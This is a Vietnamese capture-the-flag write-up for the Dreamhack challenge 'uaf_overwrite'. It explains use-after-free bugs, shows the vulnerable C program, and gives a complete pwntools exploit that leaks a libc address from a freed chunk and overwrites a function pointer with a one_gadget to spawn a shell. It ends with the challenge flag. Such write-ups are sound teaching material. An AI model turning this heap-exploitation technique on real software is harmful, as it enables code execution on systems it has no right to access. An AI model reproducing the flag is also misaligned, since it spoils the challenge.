# uaf_overwrite

1 chall thú vị trên dreamhack

trước khi bước vào giải chall này thì cần **hiểu về Use After Free Bug và cách khai thác nó**

## Use After Free

đầu tiên thì **bạn cần có kiến thức về heap cũng như các bins, tcache,** có thể tham khỏa tại đây:

**Heap Introducing**: https://hackmd.io/@trhoanglan04/SyKLQL1Pn

để dễ dàng hình dung ra **Use After Free** là gì thì mình sẽ đưa ra 1 ví dụ thực tế đó là:
- Khi thuê căn hộ studio và hết hạn hợp đồng, người thuê phải trả lại quyền sử dụng căn hộ studio cho chủ nhà. Nếu mở cửa bằng chìa khóa thì phải trả lại chìa khóa, còn nếu dùng khóa cửa thì phải đặt lại mật khẩu khóa cửa. Sau đó, chủ nhà dọn dẹp căn hộ studio và tìm người thuê mới.
- Nếu quyền truy cập của người thuê trước không bị thu hồi, studio có thể được sử dụng mà không được phép ngay cả sau khi hợp đồng kết thúc. Ngoài ra, **nếu căn phòng không được dọn dẹp kỹ lưỡng và các tài liệu chứa thông tin cá nhân của người thuê trước bị bỏ lại, có nguy cơ người thuê tiếp theo sẽ biết thông tin cá nhân của người thuê trước.**

oke đọc qua ví dụ trên ta hình dung sơ sơ về UAF rồi đó, bây giờ áp dùng nó vào nghiên cứu thôi:
- Trong pwnable, khi ta sử dụng hàm **malloc()** và khởi tại 1 vùng nhớ heap có kích thức cố định, ta hoàn toàn có quyền nhập các dữ liệu ta muốn vào **chunk** này. 
- Sau khi sử dụng xong, thì ta sẽ dùng hàm **free()** để giải phóng nó đi. 
- Như các bạn đã biết thì sau khi **free()** xong thì **cái chunk ta vừa free sẽ được lưu trong các bins hoặc tcache nhằm tối ưu bộ nhớ.** 
- Và khi ta **malloc** 1 chunk mới có kích thức tương tự như chunk ta vừa **free**, thì chương trình sẽ lấy cái **chunk** đó gán vào vào **chunk** ta mới tạo, lúc này ta hoàn toàn có được dữ liệu của cái **chunk** ta đã **free** rồi
- **lúc này lỗi Use After Free đã xuất hiện**, Điều này có thể rất hữu ích cho các cuộc tấn công khác

để hiểu rõ hơn về **lỗi UAF** thì ta nên tham khảo qua ví dụ này:

- **Nightmare:** https://guyinatuxedo.github.io/27-edit_free_chunk/uaf_explanation/index.html

- **dreamhack:** https://learn.dreamhack.io/106#4

đến đây rồi thì ta đã nắm chắc về UAF bug rồi, giờ chấp tay vào để giải chall này thôi

## Source C

```c 
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}

```

bây giờ ta bước vào phân tích thôi 

![image](https://github.com/gookoosss/CTF/assets/128712571/680a59eb-c258-4a1a-90c6-aa9612dfe99f)



ái chà full tank à :))

## Analysis
- để ý thì thấy **struct Human và Robot** có kích thước tương ứng nhau
- nhìn vào hàm **Human_func thì ta được phép nhập vào giá trị cho Weight và Age**, còn hàm **Robot_func thì chỉ nhập được Weight**
- ồ để ý **hàm Robot_func thì ta hoàn toán có thể tạo shell** nếu thay đổi con trỏ fptr thành one_gadget, lúc này ta đã có mục tiêu khai thác
- vấn đề ở đây là chương trình không cho phép ta nhập vào fptr, ta cũng chưa có được địa chỉ libc để sử dụng one_gadget cả
- đến đây thì ta nghĩ ngay đến **bug UAF** mà ta vừa học, là **biến Age trong Human nó tương tự như fptr của Robot** vậy
- vậy nên ta sẽ **lợi dụng lỗi UAF để nhập one_gadget vào Age của Human** , sau đó free nó và khởi tạo thằng Robot, **lúc này thì fptr đang chứa dữ liệu của Age là one_gadget**
- bây giờ ta chỉ cần leak được libc base nữa là xong vấn đề 
- để ý thì sau khi free xong thì nó sẽ trả về địa chỉ của **main_arena**, cũng là **địa chỉ của libc** 

![image](https://github.com/gookoosss/CTF/assets/128712571/5aaa235c-9a78-421d-b78b-58d82e466ab6)

- lợi dụng lỗi UAF thì ta có thể leak được địa chỉ này và tính được **libc base**

## Exploit

- **Stage 1: leak libc**

để leak libc thì ta cần sử dụng hàm **custom_func**

như đã phân tích ở trên xong sau khi free xong thì nó trả về 1 địa chỉ libc ở phần Data, ta malloc 1 chunk có kích thước tương tự chunk trước thì ta hoàn toàn có leak ra được địa chỉ này, từ đó tính offset ra libc base

### Note

- để có thể leak được địa chỉ main_arena, **ta cần khởi tạo cho nó lớn hơn 0x400 byte**, lý do là nếu nhỏ hơn thì sau khi free nó sẽ lưu trong tcache và ko có được địa chỉ ta cần
- **khi free ta cần tạo 1 chunk khác ngăn cách chunk ta cần free vs top chunks**, lý do nếu ta free chunk liền kế với top chunk thì nó sẽ gộp chunk đó vào top chunk luôn và ta không có được địa chỉ ta cần

![image](https://github.com/gookoosss/CTF/assets/128712571/1b62cefd-8fb0-4e5e-b3ba-32d363dded24)



```python
# Stage 1: leak libc 

# tạo 1 chunk cần free nhưng không free
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Size: ', str(0x500))
p.sendafter(b'Data: ', b'a')
p.sendlineafter(b'idx: ', b'10') # index đã lớn hơn 9 nên ko free

# tạo 1 chunk ngăn cách và free chunk trên 
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Size: ', str(0x500))
p.sendafter(b'Data: ', b'a')
p.sendlineafter(b'idx: ', b'0') # index = 0 là chunk trên á

# tới đây leak libc thôi
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Size: ', str(0x500))
p.sendafter(b'Data: ', b'a')
p.recvuntil(b'Data: ') # lúc này Data đang là địa chỉ main_arena
libc_leak =  u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x3ebc61
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
p.sendlineafter(b'idx: ', b'10')

```

- **Stage 2: tạo shell** 

đến đây thì có vẻ đơn giản rồi vì ta chỉ cần lợi dụng lỗi UAF để gán giá trị của Age là one_gadget vào fptr để tạo shell thôi

```python
# Stage 2: tạo shell

one_gadget = libc.address + 0x10a41c 

# Human
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Weight: ', b'1') 
p.sendlineafter(b'Age: ', str(one_gadget)) # Age = one_gadet

# robot
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Weight: ', b'1')
# fptr = Age = one_gadget

p.interactive()

```

chạy thử xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/cfa19eb4-e834-49d1-abde-261e16c4b39d)


tuyệt vời, và ta có flag rồi

## script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./uaf_overwrite_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
context.binary = exe
p = process([exe.path])
        
# gdb.attach(p, gdbscript = '''
# b*custom_func+266
# b*robot_func+120
# c
# ''')

# input()
 
p = remote("Host3.dreamhack.games", 9835)

# Stage 1: leak libc 

# tạo 1 chunk cần free nhưng không free
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Size: ', str(0x500))
p.sendafter(b'Data: ', b'a')
p.sendlineafter(b'idx: ', b'10') # index đã lớn hơn 9 nên ko free

# tạo 1 chunk ngăn cách và free chunk trên 
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Size: ', str(0x500))
p.sendafter(b'Data: ', b'a')
p.sendlineafter(b'idx: ', b'0') # index = 0 là chunk trên á

# tới đây leak libc thôi
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Size: ', str(0x500))
p.sendafter(b'Data: ', b'a')
p.recvuntil(b'Data: ') # lúc này Data đang là địa chỉ main_arena
libc_leak =  u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x3ebc61
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
p.sendlineafter(b'idx: ', b'10')

# Stage 2: tạo shell

one_gadget = libc.address + 0x10a41c 

# Human
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Weight: ', b'1') 
p.sendlineafter(b'Age: ', str(one_gadget)) # Age = one_gadet

# robot
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Weight: ', b'1')
# fptr = Age = one_gadget

p.interactive()

# DH{130dbd07d09a0dc093c29171c7178545aa9641af8384fea4942d9952ed1b9acd}

```

## Flag 

DH{130dbd07d09a0dc093c29171c7178545aa9641af8384fea4942d9952ed1b9acd}
